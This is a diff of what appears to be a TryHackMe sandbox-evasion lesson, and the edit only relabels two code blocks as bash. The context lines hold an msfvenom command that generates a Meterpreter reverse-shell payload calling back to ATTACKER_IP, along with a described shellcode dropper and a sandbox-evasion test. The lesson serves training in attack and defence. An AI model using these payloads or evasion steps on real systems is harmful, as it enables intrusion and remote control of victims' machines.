@@ -196,7 +196,7 @@ Now that you have a better understanding of what Sandbox Bypass method types exi
 Before we move on to the next task, we're going to be starting with a basic dropper that retrieves shellcode from a Web Server (specifically from /index.raw) and injects it into memory, and executes the shellcode. It's important to note that all shellcode must be generated with MSFVenom in a raw format, and must be 64-bit, not 32-bit. It can be generated with the following command.
 
    Generating Shellcode with MSFVenom  
-```Generating Shellcode with MSFVenom 
+```bash
 user@attack-box$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -576,7 +576,7 @@ When you are finished developing your payload and are ready to test your evasion
  
 
    THM Sandbox Binary Syntax  
-```THM Sandbox Binary Syntax 
+```bash
 C:\Users\Administrator\Desktop\Materials\> .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
 [+] Memory Check found!
 [+] Network Check found!
